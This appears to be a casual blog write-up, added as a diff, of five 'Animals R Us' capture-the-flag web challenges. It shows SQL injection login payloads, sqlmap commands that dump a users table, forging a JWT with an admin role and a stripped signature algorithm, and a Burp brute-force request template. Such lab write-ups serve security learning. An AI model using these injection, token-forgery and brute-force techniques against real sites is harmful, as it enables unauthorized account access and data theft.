@@ -1,0 +1,135 @@
+---
+title: 'web/GooseCTF: Animals R Us'
+date: '2025-05-10'
+url: 'web-goosectf-animalsrus'
+summary: 'sql injection, jwts, and lot of burp suite.'
+tags:
+  - Web
+---
+
+
+web chal this time: not very good at web tho. or anything
+
+logging onto the instance we have this login page
+
+![image](/images/animal1.png)
+
+## Animals R Us 1 - In Plain SQLight
+
+for this chal you simply have to login as the user james. 
+
+first, i looked around the website and checked out /login.js.
+then looking at the chal title i realized it was probably sql injection so i put a random payload 
+' OR 1=1 in the password, and it returned 
+```
+{
+    "message": "Server error",
+    "error": {
+        "message": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1",
+        "code": "ER_PARSE_ERROR",
+        "errno": 1064,
+        "sql": "SELECT * FROM users WHERE username = 'james' AND BINARY password = '' OR 1=1'",
+        "sqlState": "42000",
+        "sqlMessage": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"
+    }
+}
+```
+now having the sql text, i put james' -- into the username to comment out the password part and voila. got the flag.
+
+## Animals R Us 2 - Out of SQLight, Out of Mind
+
+This one was also pretty easy, i used sqlmap to dump the tables in the users table.
+
+req.txt:
+```
+POST /login HTTP/2
+Host: kbnik11f-animals-r-us-2-out-of-sqlight-out-of-mind.chall.lilypadd.com
+Cookie: theme=light; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywidXNlcm5hbWUiOiJqYW1lcyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQ2OTI3Mjc2LCJleHAiOjE3NDY5MzA4NzZ9.O143rfDD9MjWO4Rfuk4ymXRQjXisESjvrgjZp-3HFzA
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://kbnik11f-animals-r-us-2-out-of-sqlight-out-of-mind.chall.lilypadd.com/login
+Content-Type: application/json
+Origin: https://kbnik11f-animals-r-us-2-out-of-sqlight-out-of-mind.chall.lilypadd.com
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+{"username":"INJECT_HERE","password":"a"}
+```
+
+then 
+```
+sqlmap -r req.txt --batch -p username --dbs
+sqlmap -r req.txt --batch -p username -D web_db --tables
+sqlmap -r req.txt --batch -p username -D web_db -T users --columns
+sqlmap -r req.txt --batch -p username -D web_db -T users --dump
+```
+and you get the password.
+
+## Animals R Us 3 - Signing Off
+in here you have to gain access to /admin.
+
+This one was also really easy. whenever I went to /admin it kicked me out, so I thought there had to be some
+admin privileges my james user was missing. So i looked at my cookies and decoded my jwt token:
+``` eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywidXNlcm5hbWUiOiJqYW1lcyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQ2OTkxOTA2LCJleHAiOjE3NDY5OTU1MDZ9.Bm4oQkxO7qpL9jUkGU8hzTXHkwAPyM_Vws48tnvQ7AQ ```
+
+into this:
+```
+{
+  "id": 3,
+  "username": "james",
+  "role": "user",
+  "iat": 1746991906,
+  "exp": 1746995506
+}
+```
+I changed role to admin, set my cookie, and was able to access /admin. 
+
+## Animals R Us 4 - Signature? None Thanks
+
+using the jwt token from last time, i changed my username to william and tried to go to /settings but it didnt work.
+I tried using burp suite to see what the server was responding with but it only redirected me to the login page. 
+Looking at the chal title, i felt it had something to do with the jwt signature and somehow negating it. 
+
+jwt header:
+```
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+```
+somehow getting rid of HS256 from the alg text allowed me to access settings. Did i get lucky? hell yea. I have no idea how that worked.
+
+## Animals R Us 5 - letmein
+
+Now we have to bruteforce jane's login password with the provided wordlist. Putting this into burpsuite with the wordlist and then setting the password to be changed was easy enough. 
+looking at all the requests, find the password that doesn't return an status code of 400, and thats your password. 
+
+should be sum like this
+```
+POST /login HTTP/2
+Host: kbnik11f-animals-r-us-2-out-of-sqlight-out-of-mind.chall.lilypadd.com
+Cookie: theme=light; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywidXNlcm5hbWUiOiJqYW1lcyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQ2OTI3Mjc2LCJleHAiOjE3NDY5MzA4NzZ9.O143rfDD9MjWO4Rfuk4ymXRQjXisESjvrgjZp-3HFzA
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://kbnik11f-animals-r-us-2-out-of-sqlight-out-of-mind.chall.lilypadd.com/login
+Content-Type: application/json
+Origin: https://kbnik11f-animals-r-us-2-out-of-sqlight-out-of-mind.chall.lilypadd.com
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+{"username":"lucy","password":"§pwd§"}
+```
+
+
+
+In all i dont like web but at least i got all those chals done.
